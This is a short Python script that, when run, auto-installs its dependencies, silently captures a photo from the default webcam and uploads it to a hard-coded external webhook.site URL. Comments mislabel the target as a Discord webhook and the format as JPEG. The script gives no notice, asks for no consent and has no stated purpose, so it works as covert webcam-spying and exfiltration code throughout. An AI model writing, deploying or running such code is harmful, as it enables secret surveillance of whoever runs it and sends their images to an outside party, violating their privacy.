import os
import subprocess
import sys
import io

# Function to install a package if it's not already installed
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Automatically install dependencies if they are not already installed
try:
    import cv2
except ImportError:
    print("opencv-python not found, installing...")
    install("opencv-python")

try:
    import requests
except ImportError:
    print("requests not found, installing...")
    install("requests")

# Now we can proceed with the rest of the code
import cv2
import time
import numpy as np  # Import numpy for the sharpening filter

# Function to capture a photo and send it to the Discord webhook
def capture_and_send_to_webhook():
    # Open the default camera (index 0)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Failed to open the camera.")
        return

    # Set a lower resolution for faster capture (640x480)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)  # 640px width
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)  # 480px height

    # Capture image
    ret, frame = cap.read()
    cap.release()

    if not ret:
        print("Failed to capture image.")
        return

    # Convert the image to a format suitable for in-memory sending (JPEG)
    _, img_encoded = cv2.imencode('.png', frame)
    img_bytes = img_encoded.tobytes()  # Convert to bytes

    # Send the image to the Discord webhook (in-memory)
    send_image_to_webhook(img_bytes)

# Function to send the image to the webhook
def send_image_to_webhook(image_bytes):
    webhook_url = 'https://webhook.site/7a794315-44e8-474e-bbe1-b30e67763022'

    files = {
        'file': ('webcam.png', io.BytesIO(image_bytes), 'image/png')
    }
    data = {
        'content': 'Here is the webcam photo!'
    }

    # Send the image to the webhook
    response = requests.post(webhook_url, data=data, files=files)
    
    if response.status_code == 204:
        print("Successfully sent the image to the webhook!")
    else:
        print(f"Failed to send image. Status code: {response.status_code}")

# Capture and send the photo
capture_and_send_to_webhook()
